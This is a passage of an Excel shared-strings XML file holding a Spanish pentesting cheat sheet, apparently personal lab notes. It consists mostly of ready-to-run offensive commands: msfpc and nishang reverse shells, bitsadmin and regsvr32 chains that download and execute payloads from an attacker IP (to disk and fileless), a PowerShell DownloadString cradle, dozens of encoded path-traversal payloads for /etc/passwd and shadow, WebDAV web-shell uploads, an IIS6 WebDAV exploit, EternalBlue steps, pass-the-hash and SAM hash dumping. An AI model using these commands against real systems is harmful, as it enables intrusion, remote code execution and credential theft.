    <t>Añadimos dentro de una dll con permisos una reverse shell</t>
  </si>
  <si>
    <t>Para que al cargar la dll se ejecute la shell</t>
  </si>
  <si>
    <t xml:space="preserve">La shell mas simple que puede haber en PHP recibe un parametro </t>
  </si>
  <si>
    <t>GOWITNESS</t>
  </si>
  <si>
    <t>gowitness file --source=urls.txt</t>
  </si>
  <si>
    <t>Nos saca una captura de todas las peticiones a los dominios DNS</t>
  </si>
  <si>
    <t>ESTENOGRAFIA</t>
  </si>
  <si>
    <t>steghide extract -sf archivo.jpg</t>
  </si>
  <si>
    <t>Nos pide que le proporcionemos una contraseña</t>
  </si>
  <si>
    <t>Extraer informacion oculta de una imagen -sf hace referencia al archivo stegofile</t>
  </si>
  <si>
    <t>find /usr -name os.py -ls 2&gt;/dev/null</t>
  </si>
  <si>
    <t>Nos muestra los permisos de la libreria os de Python</t>
  </si>
  <si>
    <t>tcpdump -ni tun0 icmp</t>
  </si>
  <si>
    <t>-n que no convierta las direciones a nombres -i para que escuche en una interfaz</t>
  </si>
  <si>
    <t>Para comprobar por ejemplo que tenemos conexion en un netcat y le llegan los paquetes</t>
  </si>
  <si>
    <t>Muestra las cadenas de caracteres imprimibles que contengan los fichero</t>
  </si>
  <si>
    <t>domain:ikea.com -site:www.ikea.com</t>
  </si>
  <si>
    <t>Para que nos muestre subdominios</t>
  </si>
  <si>
    <t>site:*.ikea.com -site:www.ikea.com</t>
  </si>
  <si>
    <t>Para que no nos muestre la principal si no los subdominio</t>
  </si>
  <si>
    <t>OSINT</t>
  </si>
  <si>
    <t xml:space="preserve">https://checkusernames.com/ </t>
  </si>
  <si>
    <t>comprobar usuarios en redes sociales mas de 160 sitios</t>
  </si>
  <si>
    <t>https://namechk.com/</t>
  </si>
  <si>
    <t>https://hunter.io/</t>
  </si>
  <si>
    <t>Hunter es un servicio que nos permite obtener información de usuarios, correos y dominios</t>
  </si>
  <si>
    <t>https://hunter.io/domain-search</t>
  </si>
  <si>
    <t>Buscar en fuentes abiertas el listado de correos de un dominio</t>
  </si>
  <si>
    <t>http://viewdns.info/</t>
  </si>
  <si>
    <t>Conocer todo lo referente a un dominio, Reverse IP, IP History, Correo</t>
  </si>
  <si>
    <t>https://osintframework.com/</t>
  </si>
  <si>
    <t>Todo sobre OSINT</t>
  </si>
  <si>
    <t>Todo lo que se necesita y lo mas útil de OSINT</t>
  </si>
  <si>
    <t>H8mail</t>
  </si>
  <si>
    <t>h8mail -t target@example.com</t>
  </si>
  <si>
    <t>Para encontrar direcciones de email hackeadas</t>
  </si>
  <si>
    <t>Descargar de Github y hacer un pip3 install h8mail</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; https://github.com/khast3x/h8mail</t>
  </si>
  <si>
    <t>Para buscar direcciones de email hackeadas</t>
  </si>
  <si>
    <t>https://ciberpatrulla.com/links</t>
  </si>
  <si>
    <t>Enlace a herramientas OSINT</t>
  </si>
  <si>
    <t>Estan categorizadas</t>
  </si>
  <si>
    <t>ELCOMSOFT</t>
  </si>
  <si>
    <t>Elcomsoft Wireless Security Auditor</t>
  </si>
  <si>
    <t>ElcomSoft Distributed Password Recovery</t>
  </si>
  <si>
    <t>Elcomsoft Desktop Forensic Bundle</t>
  </si>
  <si>
    <t>Crackeo de claves Wifi con aceleracion GPU</t>
  </si>
  <si>
    <t>Se puede hacer distribuido</t>
  </si>
  <si>
    <t>Crackeo de archivos comprimidos, documentos office, y cryptografia a traves de GPU</t>
  </si>
  <si>
    <t>Crackeo de archivos comprimidos, documentos office, y cryptografia, Todo lo relacionado con Forense a traves de GPU</t>
  </si>
  <si>
    <t>rm -Rf directorio</t>
  </si>
  <si>
    <t>Aircrack Suite</t>
  </si>
  <si>
    <t>Para comprobar y cerrar si estan usando la interfaz monitor</t>
  </si>
  <si>
    <t>tshark -r captured.cap -R "(eapol || wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05) &amp;&amp; wlan.addr==MAC_BSSID_AP" 2&gt;/dev/null -2 -w filteredCapture -F pcap</t>
  </si>
  <si>
    <t xml:space="preserve">Filtra una captura quitando la paja, nos mantiene el nombre del AP, el BSSID y los paquetes necesarios para desencriptarlo </t>
  </si>
  <si>
    <t>Hace falta indicar la MAC del BSSID AP</t>
  </si>
  <si>
    <t>TSHARK</t>
  </si>
  <si>
    <t>airolib-ng import-passwords --import passwd dict.txt</t>
  </si>
  <si>
    <t>Para crear una rainbow table pasandole un diccionario</t>
  </si>
  <si>
    <t>airolib-ng import-passwords --import essid essid.lst</t>
  </si>
  <si>
    <t>Paso 1</t>
  </si>
  <si>
    <t>Paso 2</t>
  </si>
  <si>
    <t>Hace falta tambien el essid para las rainbow para crear una rainbowtable</t>
  </si>
  <si>
    <t>airolib-ng import-passwords</t>
  </si>
  <si>
    <t>airolib-ng import-passwords --batch</t>
  </si>
  <si>
    <t>Para generar ya la Rainbow table</t>
  </si>
  <si>
    <t>Paso 4</t>
  </si>
  <si>
    <t>Paso 3</t>
  </si>
  <si>
    <t>Capturar paquetes en modo monitor</t>
  </si>
  <si>
    <t>Pyrit</t>
  </si>
  <si>
    <t>pyrit -r captura.cap analyze</t>
  </si>
  <si>
    <t>Nos dice que tipo de captura es</t>
  </si>
  <si>
    <t>pyrit -e SSID create_essid</t>
  </si>
  <si>
    <t>pyrit -i dict import_passwords</t>
  </si>
  <si>
    <t>pyrit batch</t>
  </si>
  <si>
    <t>pyrit -r filteredCapture attack_db</t>
  </si>
  <si>
    <t>airdecap-ng -e NombreRED -p Contraseña captured.cap</t>
  </si>
  <si>
    <t>Nos permite desencriptar la captura, se guarda en un nuevo fichero -dec.cap de decrypted</t>
  </si>
  <si>
    <t>tshark -r captured-dec.cap 2&gt;/dev/null</t>
  </si>
  <si>
    <t>Hace falta la contraseña de la RED</t>
  </si>
  <si>
    <t>Para ver la captura interceptada desencriptada</t>
  </si>
  <si>
    <t>Hace falta tener la contraseña de la red, con "tshark -r captured-dec.cap 2&gt;/dev/null" se puede ver el contenido de la captura</t>
  </si>
  <si>
    <t>Paso 4 (Utiliza GPU)</t>
  </si>
  <si>
    <t>Para limpiar saltos de linea innecesario</t>
  </si>
  <si>
    <t>Para atacar una captura con la rainbow table creada</t>
  </si>
  <si>
    <t>FORENSE DE IMÁGENES</t>
  </si>
  <si>
    <t>http://fotoforensics.com/</t>
  </si>
  <si>
    <t>https://29a.ch/photo-forensics/#forensic-magnifier</t>
  </si>
  <si>
    <t>Forensically</t>
  </si>
  <si>
    <t>https://www.diffchecker.com/image-diff</t>
  </si>
  <si>
    <t>Comparar diferencias entre 2 imágenes</t>
  </si>
  <si>
    <t>Compara la compresion, luminosidad para detectar imágenes falsas</t>
  </si>
  <si>
    <t>Herramienta muy completa que comprueba todo para detectar imágenes falsas y añadiciones</t>
  </si>
  <si>
    <t>Para ver las particiones montadas en Linux</t>
  </si>
  <si>
    <t>ls -a /.dockerenv</t>
  </si>
  <si>
    <t>df -h</t>
  </si>
  <si>
    <t>Para saber si estamos en un Docker</t>
  </si>
  <si>
    <t>nc -nlvp 4646 &gt; archivo_a_descargar</t>
  </si>
  <si>
    <t>Descargar archivos con netcat</t>
  </si>
  <si>
    <t>En la otra maquina nc -IP 4646 &lt; archivo_a_descargar</t>
  </si>
  <si>
    <t>docker run -v /:/mnt/ -i -t nombre_contenedor bash</t>
  </si>
  <si>
    <t xml:space="preserve">Crea una montura del directorio raiz sobre un contenedor </t>
  </si>
  <si>
    <t>cd /mnt/root</t>
  </si>
  <si>
    <t>dockerd</t>
  </si>
  <si>
    <t>Es el demonio de Docker</t>
  </si>
  <si>
    <t>STRINGS</t>
  </si>
  <si>
    <t xml:space="preserve">strings /dev/sdb </t>
  </si>
  <si>
    <t>Ver archivos eliminados</t>
  </si>
  <si>
    <t>Introducir la particion</t>
  </si>
  <si>
    <t>cat /proc/net/fib_trie | grep -B1 "32 hosts LOCAL"</t>
  </si>
  <si>
    <t>Poder ver los segmentos de red de los que dispone</t>
  </si>
  <si>
    <t>cat /proc/net/arp</t>
  </si>
  <si>
    <t>Para mirar el ARP</t>
  </si>
  <si>
    <t>disown %</t>
  </si>
  <si>
    <t>Para independizar un proceso hijo del padre, cuando se usa por ejemplo dockerd</t>
  </si>
  <si>
    <t xml:space="preserve"> dockerd &gt; /dev/null 2&gt;&amp;1 &amp;   Que lo ejecuta en segundo plano, si se cierra se pierde, usar disown % a continuacion para independizarlo</t>
  </si>
  <si>
    <t>cd /opt &amp;&amp; https://github.com/liamg/furious</t>
  </si>
  <si>
    <t>FURIOUS</t>
  </si>
  <si>
    <t>furious -s connect 10.10.10.10</t>
  </si>
  <si>
    <t>Muy rapido</t>
  </si>
  <si>
    <t>furious -s syn 10.10.10.10</t>
  </si>
  <si>
    <t>go get -u github.com/liamg/furious</t>
  </si>
  <si>
    <t>Como nmap en go</t>
  </si>
  <si>
    <t>Como nmap en Go Syn Scan</t>
  </si>
  <si>
    <t>Como nmap en Go Connect Scan</t>
  </si>
  <si>
    <t>find / -perm -u=s -type f 2&gt;/dev/null | grep -E "/aria2c|/arp|/ash|/base32|/base64|/bash|/busybox|/cat|/chmod|/chown|/chroot|/cp|/csh|/curl|/cut|/dash|/date|/dd|/dialog|/diff|/dmsetup|/docker|/emacs|/env|/eqn|/expand|/expect|/file|/find|/flock|/fmt|/fold|/gdb|/gimp|/grep|/gtester|/hd|/head|/hexdump|/highlight|/iconv|/ionice|/ip|/jjs|/jq|/jrunscript|/ksh|/ksshell|/ld.so|/less|/logsave|/look|/lwp-download|/lwp-request|/make|/more|/mv|/nano|/nice|/nl|/node|/nohup|/od|/openssl|/perl|/pg|/php|/pico|/python|/readelf|/restic|/rlwrap|/rpm|/rpmquery|/rsync|/run-parts|/rvim|/sed|/setarch|/shuf|/soelim|/sort|/start-stop-daemon|/stdbuf|/strace|/strings|/sysctl|/systemctl|/tac|/tail|/taskset|/tclsh|/tee|/tftp|/time|/timeout|/ul|/unexpand|/uniq|/unshare|/uudecode|/uuencode|/vim|/watch|/wget|/xargs|/xxd|/xz|/zsh|/zsoelim"</t>
  </si>
  <si>
    <t>Archivos que si tienen SUID se puede hacer una escalada de privilegios</t>
  </si>
  <si>
    <t>WAFW00F</t>
  </si>
  <si>
    <t>wafw00f IP:puerto</t>
  </si>
  <si>
    <t>Para ver si tiene algun firewall la pagina web</t>
  </si>
  <si>
    <t>WAF Web Aplication Firewall</t>
  </si>
  <si>
    <t>bash -p</t>
  </si>
  <si>
    <t xml:space="preserve">Para que conserve el SUID cuando le cambiamos permisos </t>
  </si>
  <si>
    <t>EXTENSIONES DE CARGA</t>
  </si>
  <si>
    <t>/usr/share/seclists/Discovery/Web-Content/raft-small-extensions-lowercase.txt</t>
  </si>
  <si>
    <t>Para probar en el upload de ficheros de una pagina web que extensiones permite</t>
  </si>
  <si>
    <t>Usar con el Intruder de Burp</t>
  </si>
  <si>
    <t>MSFPC (Payload Creator)</t>
  </si>
  <si>
    <t>msfpc -h</t>
  </si>
  <si>
    <t>Para ver la ayuda de como se generan los payload</t>
  </si>
  <si>
    <t xml:space="preserve">msfpc windows 10.10.10.10 CMD reverse verbose </t>
  </si>
  <si>
    <t>Nos genera una shell reversa para windows estilo CMD</t>
  </si>
  <si>
    <t>Si se quita el CMD o se pone MSF nos genera un Meterpreter</t>
  </si>
  <si>
    <t xml:space="preserve">msfpc windows 10.10.10.10 CMD reverse staged verbose </t>
  </si>
  <si>
    <t>Nos genera una shell reversa para windows estilo MSF Meterpreter Staged</t>
  </si>
  <si>
    <t>STAGED está ligado a Metasploit y el STAGELESS es más pequeño y estable, suelen ser pequeñas Shell. El tipo STAGED son mejores en entornos de alta latencia. El tipo STAGELESS son vistas como mejores para bypassear un AV</t>
  </si>
  <si>
    <t>BITSADMIN</t>
  </si>
  <si>
    <t>bitsadmin /transfer pablo_poc http://1.1.1.1/file.png c:\destino\file.png</t>
  </si>
  <si>
    <t>Para descargar un recurso y donde almacenarlo</t>
  </si>
  <si>
    <t>Start-BitsTransfer -Source http://10.10.10.10/shell.exe -Destination c:\destino\shell.exe</t>
  </si>
  <si>
    <t>cmdlet de powershell</t>
  </si>
  <si>
    <t>Start-BitsTransfer -Credential Username\Domain -Source https://[URL] -Destination [Ruta] -ProxyUsage Override -ProxyList @(https://proxy1, 123.24.21.23, proxy3)</t>
  </si>
  <si>
    <t>Para autenticarse, usar proxys....</t>
  </si>
  <si>
    <t>bitsadmin /create job</t>
  </si>
  <si>
    <t>bitsadmin /addfile job http://10.10.10.10/shell.exe c:\destino\shell.exe</t>
  </si>
  <si>
    <t>bitsadmin /setnotifycmdline job cmd.exe “/c bitsadmin /complete job | start /B c:\destino\shell.exe</t>
  </si>
  <si>
    <t>bitsadmin /resume job</t>
  </si>
  <si>
    <t>Para finalizar</t>
  </si>
  <si>
    <t>Para que la ejecute</t>
  </si>
  <si>
    <t>Para que descargue y guarde el archivo</t>
  </si>
  <si>
    <t>Para crear un trabajo</t>
  </si>
  <si>
    <t>1 paso para descargar y ejecutar una shell en disco</t>
  </si>
  <si>
    <t>2 paso para descargar y ejecutar una shell en disco</t>
  </si>
  <si>
    <t>3 paso para descargar y ejecutar una shell en disco</t>
  </si>
  <si>
    <t>4 paso para descargar y ejecutar una shell en disco</t>
  </si>
  <si>
    <t>exploits/multi/script/web_delivery</t>
  </si>
  <si>
    <t>Para generar un payload file less</t>
  </si>
  <si>
    <t xml:space="preserve">Hay que cambiar el target, Set target 2 es powershell, Set target 3 es para un file less usando el registro </t>
  </si>
  <si>
    <t xml:space="preserve">bitsadmin /addfile job http://10.10.10.10/shell.exe c:\destino\shell.exe </t>
  </si>
  <si>
    <t>bitsadmin /setnotifycmdline job regsvr32.exe "/s /n /u /i:http://[ip_y_puerto]/dE8vICrV.sct scrobj.dll</t>
  </si>
  <si>
    <t>Necesario aunque no se use, necesita descargar algo</t>
  </si>
  <si>
    <t>Instrucción que nos devolvió el módulo web_delivery</t>
  </si>
  <si>
    <t>1 paso para descargar y ejecutar una shell sin tocar disco</t>
  </si>
  <si>
    <t>2 paso para descargar y ejecutar una shell sin tocar disco</t>
  </si>
  <si>
    <t>3 paso para descargar y ejecutar una shell sin tocar disco</t>
  </si>
  <si>
    <t>https://www.hacking.land/2020/04/hacking-windows-bitsadmin-for-pentesters.html?m=1</t>
  </si>
  <si>
    <t>https://www.elladodelmal.com/2017/02/metasploit-web-delivery-un-modulo-que.html</t>
  </si>
  <si>
    <t>Enlace referencia de lo anterior</t>
  </si>
  <si>
    <t>Para descargar un recurso y donde almacenarlo con BITSAdmin powershell</t>
  </si>
  <si>
    <t>Es el cmdlet de BitsAdmin para powershell</t>
  </si>
  <si>
    <t>Para conectarse a una pagina web, autenticarse, usando proxys…</t>
  </si>
  <si>
    <t>runas /user:nombreusuario &lt;programa&gt;</t>
  </si>
  <si>
    <t>runas /user:administrator regedit</t>
  </si>
  <si>
    <t>https://protegermipc.net/2018/09/05/ejemplos-uso-del-comando-runas-en-windows/</t>
  </si>
  <si>
    <t>Para ejecutar un comando o un programa como otro usuario</t>
  </si>
  <si>
    <t>Para ejecutar un comando o un programa como administrador, en este caso el regedit</t>
  </si>
  <si>
    <t>Por linea de comandos</t>
  </si>
  <si>
    <t>PATH TRANSVERSAL</t>
  </si>
  <si>
    <t>../../../../../../../../../etc/passwd</t>
  </si>
  <si>
    <t>..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd</t>
  </si>
  <si>
    <t>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd</t>
  </si>
  <si>
    <t>%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</t>
  </si>
  <si>
    <r>
      <t>Que se traduce a </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF202122"/>
        <rFont val="Courier New"/>
        <family val="3"/>
      </rPr>
      <t>../</t>
    </r>
  </si>
  <si>
    <t>%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd</t>
  </si>
  <si>
    <t>Que se traduce a ..\</t>
  </si>
  <si>
    <t>..%2f..%2f..%2fetc%2fshadow</t>
  </si>
  <si>
    <t>..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd</t>
  </si>
  <si>
    <t>\ En UTF-8 Microsoft Web Server</t>
  </si>
  <si>
    <t>..%c1%1c..%c1%1c..%c1%1c..%c1%1c..%c1%1cetc/passwd</t>
  </si>
  <si>
    <t>/ En UTF-8 Microsoft Web Server</t>
  </si>
  <si>
    <t>..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</t>
  </si>
  <si>
    <t>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</t>
  </si>
  <si>
    <t>%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e%2fetc%2fpasswd</t>
  </si>
  <si>
    <t>%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd</t>
  </si>
  <si>
    <t>..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%2fpasswd</t>
  </si>
  <si>
    <t>..%c1%1c..%c1%1c..%c1%1c..%c1%1c..%c1%1cetc%2fpasswd</t>
  </si>
  <si>
    <t>..%c0%9v..%c0%9v..%c0%9v..%c0%9v..%c0%9v..%c0%9vetc%2fpasswd</t>
  </si>
  <si>
    <t>..%c0%9v..%c0%9v..%c0%9v..%c0%9v..%c0%9v..%c0%9vetc/passwd</t>
  </si>
  <si>
    <t>%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%2fpasswd</t>
  </si>
  <si>
    <t>%2e%2e%2%2e%2e%2%2e%2e%2%2e%2e%2%2e%2e%2etc/passwd</t>
  </si>
  <si>
    <t>%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cetc/passwd</t>
  </si>
  <si>
    <t>%2e%2e%2%2e%2e%2%2e%2e%2%2e%2e%2%2e%2e%2etc%2passwd</t>
  </si>
  <si>
    <t>%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cetc%255cpasswd</t>
  </si>
  <si>
    <t>./../../../../etc/passwd&amp;=%3C%3C%3C%3C</t>
  </si>
  <si>
    <t>../../../../../../../../../../../../../../../etc/passwd%00</t>
  </si>
  <si>
    <t>%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/passwd</t>
  </si>
  <si>
    <t>%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc%u2215passwd</t>
  </si>
  <si>
    <t>%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc/passwd</t>
  </si>
  <si>
    <t>%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc%u2216passwd</t>
  </si>
  <si>
    <t>%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd</t>
  </si>
  <si>
    <t>%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd</t>
  </si>
  <si>
    <t>https://book.hacktricks.xyz/pentesting-web/file-inclusion</t>
  </si>
  <si>
    <t>Gitbook de Pentesting</t>
  </si>
  <si>
    <t>Excelente</t>
  </si>
  <si>
    <t>Para ejecutar scripts contra el smb y ver si tiene vulnerabilidades</t>
  </si>
  <si>
    <t>nmap -p 445 10.10.10.10 --script=smb-vuln* -o nmap_smb.txt</t>
  </si>
  <si>
    <t>EXPLOITS WINDOWS</t>
  </si>
  <si>
    <t>https://github.com/jivoi/pentest/tree/master/exploit_win</t>
  </si>
  <si>
    <t>Para exploits Windows</t>
  </si>
  <si>
    <t>send_and_exploit.py</t>
  </si>
  <si>
    <t>Otra forma de explotar Eternal</t>
  </si>
  <si>
    <t>Mejor Autoblue</t>
  </si>
  <si>
    <t>\\</t>
  </si>
  <si>
    <t>Es una forma de escapar las barras en los lenguajes de programacion</t>
  </si>
  <si>
    <t>python windows-exploit-suggester.py -u</t>
  </si>
  <si>
    <t>Para que copie la base de datos</t>
  </si>
  <si>
    <t>python windows-exploit-suggester.py -d mssb.xls -i systeminfo.txt</t>
  </si>
  <si>
    <t>Para que nos busque metodos de escalada de privilegios</t>
  </si>
  <si>
    <t>Invoke-PowerShellTcp</t>
  </si>
  <si>
    <t>De nishang</t>
  </si>
  <si>
    <t>Shell reversa en powershell</t>
  </si>
  <si>
    <t>C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe\ iex(New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-MS16032.ps1')"</t>
  </si>
  <si>
    <t>Esto se hace con Sysnative para que no lo redirija a Syswow64 y lo haga a system32</t>
  </si>
  <si>
    <t>Cuando powershell seaa de 64 bits y estemos en un netcat de 32 tenemos que redirigir</t>
  </si>
  <si>
    <t>Para usar wget dentro de powershell</t>
  </si>
  <si>
    <t>powershell wget http://10.10.10.10/shell.exe -OutFile shell.exe</t>
  </si>
  <si>
    <t>%00 byte nulo</t>
  </si>
  <si>
    <t>En hacking web existe la tecnica de null injection ataque contra servidores web que se basa en inyectar bytes nulos, pues son los que suelen usar para cerrar cadenas</t>
  </si>
  <si>
    <t>Para escanear Drupal</t>
  </si>
  <si>
    <t>droopescan scan drupal -u http://10.10.10.10</t>
  </si>
  <si>
    <t>pip install droopscan</t>
  </si>
  <si>
    <t xml:space="preserve">Al pasarle un parametro en php para cargar la shell es con &amp; no con ? por ejemplo &amp;c=id </t>
  </si>
  <si>
    <t>hay que usar comillas dobles " puesto que estan usadas al final y se tiene que hacer asi para escaparlas</t>
  </si>
  <si>
    <t>En PHP cuando se usa un system($_GET["c"]); ?&gt;'</t>
  </si>
  <si>
    <t>apt-get install php-curl -y</t>
  </si>
  <si>
    <t>Para realizar el ataque de Drupal</t>
  </si>
  <si>
    <t>Cuando Drupal es vulnerable a algun exploit es posible que necesite este modulo</t>
  </si>
  <si>
    <t>Para no cargar el perfil en powershell como el -ep bypass</t>
  </si>
  <si>
    <t>powershell.exe -nop</t>
  </si>
  <si>
    <t>nc64.exe</t>
  </si>
  <si>
    <t>Binario de netcat de 64 buscar repositorio phackt/pentest</t>
  </si>
  <si>
    <t>COOKIES</t>
  </si>
  <si>
    <t>Enter y F5 en la pagina</t>
  </si>
  <si>
    <t>document.cookie = "Valordelacookie=SessionID;token=token"</t>
  </si>
  <si>
    <t>Para añadir una cookie manual, en el modo Inspector de la pagina, en el Console, escribir:</t>
  </si>
  <si>
    <t>DAVTEST</t>
  </si>
  <si>
    <t>Nos dice que extensiones se pueden subir con PUT</t>
  </si>
  <si>
    <t>davtest -url 10.10.10.10</t>
  </si>
  <si>
    <t>cmd.aspx</t>
  </si>
  <si>
    <t>Shell de Seclist aspx</t>
  </si>
  <si>
    <t>curl -X PUT IP/shell -d @shell.aspx</t>
  </si>
  <si>
    <t>X indica el metodo http que queremos usar  -d los datos que queremos enviar</t>
  </si>
  <si>
    <t>Cargar una shell con PUT</t>
  </si>
  <si>
    <t>curl -X MOVE -H "Destination: http://10.10.10.10/shell.aspx" http://10.10.10.10/shell.txt</t>
  </si>
  <si>
    <t>Para cambiarle la extension a la shell</t>
  </si>
  <si>
    <t>CADAVER</t>
  </si>
  <si>
    <t>cadaver 10.10.10.10 (enter) put shell1.txt</t>
  </si>
  <si>
    <t>Cliente webdav para subir cosas con metodos put y get</t>
  </si>
  <si>
    <t>apt-get install cadaver</t>
  </si>
  <si>
    <t>usr/share/windows-binaries/nc.exe</t>
  </si>
  <si>
    <t>Netcat de Windows</t>
  </si>
  <si>
    <t>COLDFUSION</t>
  </si>
  <si>
    <t>Debugging &amp; Logging --&gt; Scheduled task --&gt; New task --&gt; URL --&gt; url_shell.jsp</t>
  </si>
  <si>
    <t>Cargar una Shell en Adobe ColdFusion</t>
  </si>
  <si>
    <t>Save output to a file C:\ColdFusion8\wwwroot\CFIDE\shell.jsp</t>
  </si>
  <si>
    <t>IIS</t>
  </si>
  <si>
    <t>python iis6_reverse_shell.py IP_Maquina Port_Maquina Nuestra_IP Nuestro_Port_Reverse_Shell</t>
  </si>
  <si>
    <t>CVE 2017-7269</t>
  </si>
  <si>
    <t>Shell reversa en IIS6 WebDAV</t>
  </si>
  <si>
    <t>Nos saca los hahses NTLM de la maquina</t>
  </si>
  <si>
    <t>Ver si tiene permisos para hacer cosas, nos tiene que salir Pwn3d!</t>
  </si>
  <si>
    <t>WINEXE</t>
  </si>
  <si>
    <t>pth-winexe -U WORKGROUP/Administrator%hash_del_administrador  // 127.0.0.1 cmd.exe</t>
  </si>
  <si>
    <t>Pass the Hash, el cmd es lo que queremos ejecutar</t>
  </si>
  <si>
    <t>PTH es de Pass the Hash</t>
  </si>
  <si>
    <t>/etc/ssh/sshd_config</t>
  </si>
  <si>
    <t>PermitRootLogin yes</t>
  </si>
  <si>
    <t>Necesario en Kali para que se conecten como root a nuestra maquina</t>
  </si>
  <si>
    <t>SSH / SCP / PLINK</t>
  </si>
  <si>
    <t>plink.exe -l root -pw contraseña -R 445:127.0.0.1:445 10.10.10.10</t>
  </si>
  <si>
    <t>Para hacer un Remote Port Forwarding con Plink que es como SSH para windows</t>
  </si>
  <si>
    <t xml:space="preserve">python checker.py IP </t>
  </si>
  <si>
    <t>Para ver los pipes permitidos en Eternal</t>
  </si>
  <si>
    <t>luego en zzz_exploit descomentamos service_exec y le pasamos el comando que queremos que se ejecute, el smbConn y lo otro lo comentamos</t>
  </si>
  <si>
    <t>Descomentamos service_exec y le pasamos el comando que queremos que se ejecute, el smbConn y lo otro lo comentamos</t>
  </si>
  <si>
    <t>ORACLE</t>
  </si>
  <si>
    <t xml:space="preserve">ODAT Oracle Database Attack Tool </t>
  </si>
  <si>
    <t xml:space="preserve">odat sidguesser -s 10.10.10.10 </t>
  </si>
  <si>
    <t>ORACLE SID son los identificadores del sistema, sirve para identificar instancias unicas de la BD</t>
  </si>
  <si>
    <t>Tratar de adivinar los SID</t>
  </si>
  <si>
    <t>odat all -s 10.10.10.10 -d XE -U usuario -P contraseña</t>
  </si>
  <si>
    <t>Para lanzar todos los modulos de ODAT</t>
  </si>
  <si>
    <t>-d indica la BD</t>
  </si>
  <si>
    <t>https://github.com/quentinhardy/odat</t>
  </si>
  <si>
    <t>odat dbmsxslprocessor -s 10.10.10.10 -d XE -U usuario -P contraseña --putFile "C:\\inetpub\\wwwroot\\" " shell.aspx" "/root/SecLists/Web-Shells/FuzzDB/cmd.aspx"</t>
  </si>
  <si>
    <t>Subir un archivo con Oracle</t>
  </si>
  <si>
    <t>sqlplus scott/tiger@10.10.10.10:1521/XE as sysdba</t>
  </si>
  <si>
    <t>XE es el SID que adivinamos, el puerto, usuario y contraseña    as sysdba es para conectar con mas permisos como un sudo dentro de Oracle</t>
  </si>
  <si>
    <t xml:space="preserve">Elevación de privilegios </t>
  </si>
  <si>
    <t xml:space="preserve">select * from user_role_privs; </t>
  </si>
  <si>
    <t>Para ver los privilegios del usuario en Oracle</t>
  </si>
  <si>
    <t>powershell -nop -ep bypass</t>
  </si>
  <si>
    <t>Para ejecutar sin politicas y restricciones</t>
  </si>
  <si>
    <t>cd Des*</t>
  </si>
  <si>
    <t xml:space="preserve">Para cambiar de ruta al escritorio con comodines </t>
  </si>
  <si>
    <t>VOLATILITY</t>
  </si>
  <si>
    <t>volatility kdbgscan -f Volcado_de_memoria</t>
  </si>
  <si>
    <t>Para que nos sugiera un perfil para el volcado de memoria</t>
  </si>
  <si>
    <t>Si no con un systeminfo</t>
  </si>
  <si>
    <t>volatility -f Volcado_de_memoria --profile perfil_del_volcado hivelist</t>
  </si>
  <si>
    <t>Nos da una copia del registro que esta en memoria y los ofset necesarios para realizar por ejemplo un Hashdump</t>
  </si>
  <si>
    <t>volatility -f Volcado_de_memoria --profile perfil_del_volcado hashdump -y offset_virtual_SYSTEM -s offset_virtual_SAM</t>
  </si>
  <si>
    <t>Nos da los hashes de la SAM</t>
  </si>
  <si>
    <t xml:space="preserve">psexec.py -hashes hash_administrador -target-ip 10.10.10.10 administrator@10.10.10.10 </t>
  </si>
  <si>
    <t>PsExec Pass the Hash</t>
  </si>
  <si>
    <t>powershell gci -force</t>
  </si>
  <si>
    <t>cmdlet para ver archivos ocultos</t>
  </si>
  <si>
    <t>IIS web.config</t>
  </si>
  <si>
    <t xml:space="preserve">Como el htaccess de apache tiene una vulnerabilidad de RCE que nos permite cargar codigo asp </t>
  </si>
  <si>
    <t>https://github.com/SecWiki/windows-kernel-exploits</t>
  </si>
  <si>
    <t>Exploits compilados SecWiki</t>
  </si>
  <si>
    <t xml:space="preserve">python -m pip install -r requirements.txt </t>
  </si>
